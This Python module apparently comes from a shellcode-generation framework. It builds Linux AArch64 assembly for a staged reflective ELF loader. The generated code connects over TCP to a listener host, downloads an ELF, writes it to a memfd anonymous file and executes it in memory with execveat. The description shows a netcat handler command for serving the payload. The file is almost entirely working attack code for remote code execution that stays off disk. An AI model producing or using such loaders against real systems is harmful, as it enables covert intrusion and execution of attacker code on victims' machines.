import sys
import math
import ctypes
import struct
import random

from sickle.common.lib.generic import extract
from sickle.common.lib.generic import convert
from sickle.common.lib.generic import modparser
from sickle.common.lib.reversing import mappings
from sickle.common.lib.programmer import builder

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.linux import (
    memfd,
    fcntl,
    netinet_in,
    bits_socket,
    bits_mman_linux,
    bits_mman_shared,
)

class Shellcode():

    arch = "aarch64"

    platform = "linux"

    name = "Linux (AARCH64) TCP Reflective ELF Loader"

    module = f"{platform}/{arch}/memfd_reflective_elf_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=127.0.0.1 LPORT=42 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Debian 14.2.0-6"]

    summary = ("Staged Reflective ELF Loader via TCP over IPv4 which executes an ELF from"
              " a remote server handler")

    description = ("TCP based reflective ELF loader over IPv4 that will connect to a remote server handler"
                   " and download an ELF. Once downloaded, an anonymous file will be created to store"
                   " the ELF, ultimately executing in memory without touching disk.\n\n"

                   "As an example, your handler can be as simple as Netcat:\n\n"

                   "    nc -w 15 -lvp 42 < payload\n\n"

                   "Then you can you generate the shellcode accordingly:\n\n"

                   f"    {example_run}\n\n"

                   "Upon execution of the shellcode, you should get a connection from the target and"
                   " your ELF should execute in memory.")

    arguments = {}

    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    arguments["ACK_PACKET"] = {}
    arguments["ACK_PACKET"]["optional"] = "yes"
    arguments["ACK_PACKET"]["description"] = "File including it's path containing the acknowledgement packet response"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.sock_buffer_size = 0x400
        self.anon_file = random.randint(0x00, 0xFFFFFFFF)

        sc_args = {
            "mapping"    : 0x00,
            "sockfd"     : 0x00,
            "addr"       : 0x10,
            "anonfd"     : 0x00,
            "anon_file"  : 0x00,
            "elf_size"   : 0x00,
            "pathname"   : 0x00,
            "out"        : 0x00,
            "buffer"     : self.get_ackpk_len(),
            "readBuffer" : self.sock_buffer_size,
        }

        self.syscalls = mappings.get_linux_syscalls(["mmap",
                                                     "socket",
                                                     "connect",
                                                     "write",
                                                     "read",
                                                     "mremap",
                                                     "memfd_create",
                                                     "execveat"])

        self.stack_space = builder.calc_stack_space(sc_args)
        self.storage_offsets = builder.gen_offsets(sc_args)

    def get_ackpk_len(self):
        """Generates the size needed by the optional ACK packet sent to the
        remote server handler. Due to bugs encountered when passing raw strings
        directly as an argument, this function will read from a file.
        Additionally, it instantiates self.ack_packet.
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("ACK_PACKET" not in argv_dict.keys()):
            self.ack_packet = None
            needed_space = 0x00
        else:
            self.ack_packet = extract.read_bytes_from_file(argv_dict["ACK_PACKET"], 'r')
            needed_space = math.ceil(len(self.ack_packet)/8) * 8

        return needed_space

    def generate_source(self):
        """Returns assembly code to be converted to machine code
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = int(argv_dict["LPORT"])

        sin_addr = hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))
        sin_port = hex(convert.port_str_to_htons(lport))

        source_code = f"""
_start:
    stp x29, x30, [sp, #-16]!
    mov x29, sp
    sub sp, sp, #{self.stack_space}

create_allocation:
    eor x0, x0, x0
    mov x1, #{self.sock_buffer_size}
    mov x2, #{bits_mman_linux.PROT_READ | bits_mman_linux.PROT_WRITE}
    mov x3, #{bits_mman_linux.MAP_PRIVATE | bits_mman_linux.MAP_ANONYMOUS}
    eor x4, x4, x4
    sub x4, x4, #1
    eor x5, x5, x5
    mov x8, #{self.syscalls['mmap']}
    svc #0x1337
    str x0, [x29, #-{self.storage_offsets['mapping']}]

create_sockfd:
    mov x0, #{bits_socket.AF_INET}
    mov x1, #{bits_socket.SOCK_STREAM}
    mov x2, #{netinet_in.IPPROTO_TCP}
    mov x8, #{self.syscalls['socket']}
    svc #0x1337
    str x0, [x29, #-{self.storage_offsets['sockfd']}]

connect:
    sub x1, x29, {self.storage_offsets['addr']}

    mov x0, #0x02
    strh w0, [x1]
    add x1, x1, #0x02

    mov x0, #{sin_port}
    strh w0, [x1]
    add x1, x1, #0x02

    ldr w0, ={sin_addr}
    str w0, [x1]
    add x1, x1, #0x04

    eor x0, x0, x0
    str x0, [x1]

    ldr x0, [x29, #-{self.storage_offsets['sockfd']}]

    sub x1, x29, #{self.storage_offsets['addr']}

    mov x2, #{ctypes.sizeof(netinet_in.sockaddr)}
    mov x8, #{self.syscalls['connect']}
    svc #0x1337
        """

        if self.ack_packet != None:
            packet_buffer = convert.from_str_to_xwords(self.ack_packet)
            write_index = self.storage_offsets['buffer']

            source_code += "\nsend_ack_packet:\n"

            for i in range(len(packet_buffer["QWORD_LIST"])):
                source_code += "    ldr x0, =0x{}\n".format( struct.pack('<Q', packet_buffer["QWORD_LIST"][i]).hex() )
                source_code += "    str x0, [x29, #-{}]\n".format(hex(write_index))
                write_index -= 8

            for i in range(len(packet_buffer["DWORD_LIST"])):
                source_code += "    ldr w0, =0x{}\n".format( struct.pack('<L', packet_buffer["DWORD_LIST"][i]).hex() )
                source_code += "    str w0, [x29, #-{}]\n".format(hex(write_index))
                write_index -= 4

            for i in range(len(packet_buffer["WORD_LIST"])):
                source_code += "    ldr w0, =0x{}\n".format( struct.pack('<H', packet_buffer["WORD_LIST"][i]).hex() )
                source_code += "    strh w0, [x29, #-{}]\n".format(hex(write_index))
                write_index -= 2

            for i in range(len(packet_buffer["BYTE_LIST"])):
                source_code += "    ldr w0, ={}\n".format( hex(packet_buffer["BYTE_LIST"][i]) )
                source_code += "    strb w0, [x29, #-{}]\n".format(hex(write_index))
                write_index -= 1


            source_code += f"""
    strb w0, [x29, #-{write_index}]
    ldr x0, [x29, #-{self.storage_offsets['sockfd']}]
    sub x1, x29, #{self.storage_offsets['buffer']}
    mov x2, #{len(self.ack_packet)}
    mov x8, #{self.syscalls['write']}
    svc #0x1337
            """

        source_code += f"""

set_index:
    eor x14, x14, x14

download_stager:
    ldr x0, [x29, #-{self.storage_offsets['sockfd']}]
    sub x1, x29, #{self.storage_offsets['readBuffer']}
    mov x2, #{self.sock_buffer_size}
    mov x8, #{self.syscalls['read']}
    svc #0x1337

    cmp x0, #0x00
    b.eq download_complete

adjust_allocation:
    ldr x15, [x29, #-{self.storage_offsets['mapping']}]
    mov x12, x0
    sub x9, x29, #{self.storage_offsets['readBuffer']}

write_data:
    ldrb w10, [x9]
    strb w10, [x15, x14, lsl #0]
    add x14, x14, #0x01
    add x9, x9, #0x01
    sub x0, x0, #0x01
    cmp x0, #0x00
    cbnz x0, write_data

check_size:
    cmp x12, #0x00
    b.eq download_complete

realloc:
    ldr x0, [x29, #-{self.storage_offsets['mapping']}]
    mov x1, x14
    mov x13, x14
    add x13, x13, #{self.sock_buffer_size}
    mov x2, x13
    mov x3, #{bits_mman_shared.MREMAP_MAYMOVE}
    sub x4, x29, #{self.storage_offsets['out']}
    mov x8, #{self.syscalls['mremap']}
    svc #0x1337
    str x0, [x29, #-{self.storage_offsets['mapping']}]

    b download_stager

download_complete:
    sub x1, x29, #{self.storage_offsets['elf_size']}
    str x14, [x1]

create_memory_file:
    sub x9, x29, #{self.storage_offsets['anon_file']}
    eor x0, x0, x0
    str x0, [x9]
    ldr w0, ={hex(self.anon_file)}
    strh w0, [x9]
    mov x0, x9
    mov x1, #{memfd.MFD_CLOEXEC}
    mov x8, #{self.syscalls['memfd_create']}
    svc #0x1337

    sub x1, x29, #{self.storage_offsets['anonfd']}
    str x0, [x1]

write_to_file:
    ldr x0, [x29, #-{self.storage_offsets['anonfd']}]
    ldr x1, [x29, #-{self.storage_offsets['mapping']}]
    ldr x2, [x29, #-{self.storage_offsets['elf_size']}]
    mov x8, #{self.syscalls['write']}
    svc #0x1337

execute_elf:
    ldr x0, [x29, #-{self.storage_offsets['anonfd']}]

    eor x5, x5, x5
    sub x1, x29, #{self.storage_offsets['pathname']}
    str x5, [x1]

    sub x2, x29, #{self.storage_offsets['readBuffer']}
    mov x3, x2
    str x5, [x3]

    mov x4, {fcntl.AT_EMPTY_PATH}

    mov x8, #{self.syscalls['execveat']}
    svc #0x1337

exit:
    eor x0, x0, x0
    mov sp, x29
    ldp x29, x30, [sp], #16
    ret
        """

        return source_code

    def get_shellcode(self):
        """Returns machine code generated by the Keystone engine.
        """

        generator = Assembler(Shellcode.arch)

        src = self.generate_source()

        return generator.get_bytes_from_asm(src)
